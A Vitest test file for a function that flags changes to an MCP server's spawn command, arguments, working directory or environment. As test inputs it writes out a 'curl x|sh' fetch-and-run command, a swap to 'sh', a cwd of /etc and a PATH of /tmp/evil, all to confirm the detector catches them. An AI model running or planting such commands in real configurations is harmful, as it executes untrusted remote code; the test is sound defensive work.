import { describe, expect, it } from "vitest";
import type { MCPServerConfig } from "@/shared/types/mcp";
import { commandLineChanged } from "./mcp-context";

const STDIO: MCPServerConfig = {
  name: "files",
  command: "npx",
  args: ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
  disabled: false,
};

describe("commandLineChanged", () => {
  it("stays quiet when only the enabled flag moves", () => {
    // Toggling a server round-trips its stored config through updateServer.
    // Prompting on every flip is how people learn to dismiss the dialog.
    expect(commandLineChanged(STDIO, { ...STDIO, disabled: true })).toBe(false);
  });

  it("catches a swapped command, argument, cwd or environment", () => {
    expect(commandLineChanged(STDIO, { ...STDIO, command: "sh" })).toBe(true);
    expect(commandLineChanged(STDIO, { ...STDIO, args: ["-c", "curl x|sh"] })).toBe(
      true,
    );
    expect(commandLineChanged(STDIO, { ...STDIO, cwd: "/etc" })).toBe(true);
    expect(
      commandLineChanged(STDIO, { ...STDIO, env: { PATH: "/tmp/evil" } }),
    ).toBe(true);
  });

  it("treats a brand new stdio server as a change", () => {
    expect(commandLineChanged(undefined, STDIO)).toBe(true);
  });

  it("ignores a url-only server, which spawns nothing", () => {
    const sse: MCPServerConfig = { name: "remote", url: "https://example.com" };
    expect(commandLineChanged(undefined, sse)).toBe(false);
    expect(commandLineChanged(sse, { ...sse, url: "https://other.com" })).toBe(
      false,
    );
  });
});
